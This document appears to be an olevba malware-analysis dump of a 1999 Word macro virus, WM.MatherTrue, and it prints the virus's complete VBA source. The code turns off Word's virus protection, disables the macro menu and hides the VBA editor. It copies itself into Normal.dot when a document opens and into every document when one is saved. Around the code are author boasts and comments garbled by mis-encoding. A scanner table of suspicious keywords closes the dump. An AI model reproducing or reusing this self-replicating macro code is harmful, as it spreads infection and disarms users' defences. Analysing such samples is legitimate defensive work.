olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mtrue-92d6dc1b229330d18785956eb23d2c26ec1bdfe0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mtrue-92d6dc1b229330d18785956eb23d2c26ec1bdfe0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MatherTrue.bas 
in file: Virus.MSWord.Mtrue-92d6dc1b229330d18785956eb23d2c26ec1bdfe0 - OLE stream: 'Macros/VBA/MatherTrue'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

  Dim ResultFDoc As Boolean 'True åñëè â àêòèâíîì äîêóìåíòå åñòü ìîäóëü ñ èìåíåì Ìname
  Dim ResultFTemplite As Boolean 'True åñëè â Normal.Dot åñòü ìîäóëü ñ èìåíåì Ìname
  Dim Path_Normal As String 'ïóòü ê Normal.Dot
  Dim Path_Doc As String 'ïóòü ê àêòèâíîìó äîêóìåíòó
  Dim I As Integer 'ïåðåìåííàÿ äëÿ öèêëà
  Dim HowMach As Integer 'êîëè÷åñòâî ìîäóëåé â ïðîåêòå
  Dim Doc As Boolean
  Dim N As Integer

  Public Const Mname As String = "MatherTrue" 'èìÿ ìîäóëÿ, îòêóäà áðàòü êîä
  
'Âûçûâàåòüñÿ ïðè íàæàòèè íà êíîïêó Organizer
Public Sub Organizer()
Attribute Organizer.VB_Description = "Ìàêðîñ çàïèñàí 31.03.99 33715351"
Attribute Organizer.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.DS"
           CommandBars("Visual Basic").Enabled = True
           With CommandBars("Macro")
             For I = 1 To .Controls.Count
                 .Controls(I).Enabled = False
             Next I
           End With
           ShowVisualBasicEditor = False
           Application.DisplayStatusBar = True
           With Options
                .VirusProtection = False
                .AllowFastSave = True
                .SaveInterval = 3
           End With
End Sub

'Âûçûâàåòüñÿ ïðè íàæàòèè íà êíîïêó Macro
Public Sub ToolsMacro()
End Sub

'Âûçûâàåòüñÿ ïðè ñîçäàíèè íîâîãî äîêóìåíòà (ïðè çàïóñêå Word'à íîâûé äîêóìåíò ñîçäà¸òüñÿ àâòîìàòè÷åñêè)
Public Sub AutoNew()
           Call Organizer
End Sub

'Âûçûâàåòüñÿ ïðè àêòèâèçàöèè ðåæèìà ñîõðàíåíèÿ àêòèâíîãî äîêóìåíòà èëè øàáëîíà (íàæàòèè íà êíîïêó "Ñîõðàíèòü")
Public Sub FileSave()
              Doc = False
              N = Len(ActiveDocument.Name)
           If N < 10 Then N = 1
           If N >= 10 And N <= 99 Then N = 2
           If N >= 99 And N <= 1000 Then N = 3
           If Mid(ActiveDocument.Name, 1, Len(ActiveDocument.Name) - N) = "Äîêóìåíò" Then Doc = True
           ShowVisualBasicEditor = False
           ResultFDoc = False
           If PrintPreview = False Then
              HowMach = Application.ActiveDocument.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.ActiveDocument.VBProject.VBComponents(I).Name Then ResultFDoc = True
              Next I
              If ResultFDoc <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Normal, Destination:=Path_Doc, Name:=Mname, Object:=wdOrganizerObjectProjectItems
                 Call Organizer
              End If
            If Doc = True Then Dialogs(wdDialogFileSaveAs).Show: Exit Sub
            ActiveDocument.Save
            End If
End Sub

'Âûçûâàåòüñÿ ïðè àêòèâèçàöèè ðåæèìà ñîõðàíåíèÿ âñåõ àêòèâíûõ äîêóìåíòîâ è/èëè øàáëîíîâ (íàæàòèè íà êíîïêó "Ñîõðàíèòü âñå")
Public Sub FileSaveAll()
           ShowVisualBasicEditor = False
           Call FileSave
End Sub

'Âûçûâàåòüñÿ ïðè àêòèâèçàöèè ðåæèìà ïå÷àòè ñ òåêóùèìè óñòàíîâêàìè
Public Sub FilePrintDefault()
           ShowVisualBasicEditor = False
         '  ActiveDocument.Content.InsertAfter Text:="Âîò òàêàÿ îíà ïðàâäà-ìàìêà, à ïðîòèâ ïðàâäû íå ïîïð¸øü...Ïðèâåò  Ìèõàéëîâîé Þëüêå. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ..."
           ActiveDocument.PrintOut
End Sub

'Âûçûâàåòüñÿ ïðè àêòèâèçàöèè äèàëîãîîãî îêíà ïå÷àòè
Public Sub FilePrint()
           ShowVisualBasicEditor = False
        '   ActiveDocument.Content.InsertAfter Text:="Âîò òàêàÿ îíà ïðàâäà-ìàìêà, à ïðîòèâ ïðàâäû íå ïîïð¸øü...Ïðèâåò  Ìèõàéëîâîé Þëüêå. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ... "
           Dialogs(wdDialogFilePrint).Show
End Sub

'Âûçûâàåòüñÿ ïðè îòêðûòèè äîêóìåíòà/øàáëîíà
'èíñòàëÿöèÿ êîäà â Normal.Dot
Public Sub AutoOpen()
           ResultFTemplite = False
           If PrintPreview = False Then
              HowMach = Application.NormalTemplate.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.NormalTemplate.VBProject.VBComponents(I).Name Then ResultFTemplite = True
              Next I
              If ResultFTemplite <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Doc, Destination:=Path_Normal, Name:=Mname, Object:=wdOrganizerObjectProjectItems
              End If
           End If
End Sub
' Destroyer Inc° Or PIPA's E&CS™ Company presented the
' MacroVirus WM.MatherTrue
' (C) CopyRight 16.04.1999 Ukrein Hmelnitsky
' WM.MatherTrue Was Make In Ms Offise (MS Word - 8.0)
' Hackers And VirusMakers All Country - UNITED !!!
' "Virus For PC, PC For Virus"
' Big Hy For VRV Virus Production™, Predator'S°,SNAKE,S@S,DM,AlexHelraiser  by Destroyer Inc °
' ÄÅÌÁÅËÜ íå èçáåæåí !!!' ÀÐÈß áåññìåðòíà !!! ÀÐÈß The Best !!!
'
' #####      ######    #####    #######   ######     ####    #     #   ######   ######
' #    ##    #    #   #     #      #      #     #   #    #   #     #   #    #   #     #
' #     ##   # #      #            #      #     #   #    #   #     #   # #      #     #
' #      #   ###       #####       #      ######    #    #    #### #   ###      ######
' #     ##   # #            #      #      #  #      #    #         #   # #      #  #
' #    ##    #    #   #     #      #      #   #     #    #         #   #    #   #   #
' #####      ######    #####       #      #    #     ####     ####     ######   #    #
'
'
'         #######   #     #   #######   ##
'            #      ##    #   #     #   ##
'            #      # #   #   #
'            #      #  #  #   #
'            #      #   # #   #
'            #      #    ##   #
'         #######   #     #   #######
'
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|3qSQ                |33715351                                     |
+----------+--------------------+---------------------------------------------+

